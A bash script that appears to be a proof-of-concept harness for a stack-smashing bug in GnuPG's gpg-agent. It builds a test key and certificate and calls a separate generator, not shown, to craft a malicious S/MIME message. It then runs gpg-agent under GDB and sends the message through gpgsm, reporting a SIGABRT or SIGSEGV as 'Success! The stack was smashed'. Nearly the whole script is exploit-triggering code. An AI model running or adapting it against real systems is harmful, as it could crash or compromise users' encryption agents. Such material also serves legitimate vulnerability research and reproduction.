#!/bin/bash
set -e

# 1. Setup Environment
rngd -r /dev/urandom >/dev/null 2>&1 || true
mkdir -p ~/.gnupg
chmod 700 ~/.gnupg
echo "pinentry-program /usr/bin/pinentry-tty" > ~/.gnupg/gpg-agent.conf
echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
echo "disable-dirmngr" > ~/.gnupg/gpgsm.conf
echo "disable-crl-checks" >> ~/.gnupg/gpgsm.conf

# 2. Key/Cert Generation (OpenSSL)
echo "[*] Generating Keys..."
openssl ecparam -name prime256v1 -genkey -out private.key 2>/dev/null
openssl req -new -x509 -key private.key -out cert.pem -days 365 \
    -subj "/CN=TestUser" -set_serial 12345 2>/dev/null
openssl pkcs12 -export -inkey private.key -in cert.pem -out key.p12 \
    -passout pass: -name "TestUser"

# 3. Import
gpgconf --kill gpg-agent 2>/dev/null || true
gpg-agent --daemon --allow-loopback-pinentry >/dev/null 2>&1
echo "" | gpgsm --import --pinentry-mode=loopback --passphrase-fd 0 key.p12 2>/dev/null

# 4. Generate Malicious Message
python3 poc_gen.py crash_agent.p7m cert.pem

# 5. KILL Agent so we can run it under GDB
gpgconf --kill gpg-agent 2>/dev/null || true

echo "------------------------------------------------"
echo "[*] STARTING GDB... (This will catch the crash)"
echo "------------------------------------------------"

# Find the binary location dynamically (since Speedo puts it in a custom path)
AGENT_BIN=$(which gpg-agent)
echo "    Found agent at: $AGENT_BIN"

# Create GDB Command File
cat > gdb_cmds <<EOF
set follow-fork-mode child
run --daemon --debug-level expert
echo \n=== CRASH DETECTED ===\n
bt
info registers
quit
EOF

# Run GDB in the background
# We run gpg-agent inside GDB, redirecting output to crash_report.txt
gdb -batch -x gdb_cmds "$AGENT_BIN" > crash_report.txt 2>&1 &
GDB_PID=$!

# Give GDB a second to initialize
sleep 3

echo "[*] Triggering Exploit..."
# This command sends the malicious payload to the agent via Assuan IPC
gpgsm -d crash_agent.p7m >/dev/null 2>&1 || true

# Wait for GDB to catch the crash and write the log
sleep 5

echo "------------------------------------------------"
echo "           CRASH REPORT ANALYSIS                "
echo "------------------------------------------------"

if grep -q "SIGABRT" crash_report.txt; then
    echo "[!] RESULT: Stack Canary Triggered (SIGABRT)"
    echo "    Success! The stack was smashed, but the canary killed the process."
elif grep -q "SIGSEGV" crash_report.txt; then
    echo "[!] RESULT: Segmentation Fault (SIGSEGV)"
    echo "    Success! The stack was corrupted."
else
    echo "[?] RESULT: Unknown. Showing log..."
fi

echo ""
echo "--- GDB OUTPUT ---"
cat crash_report.txt
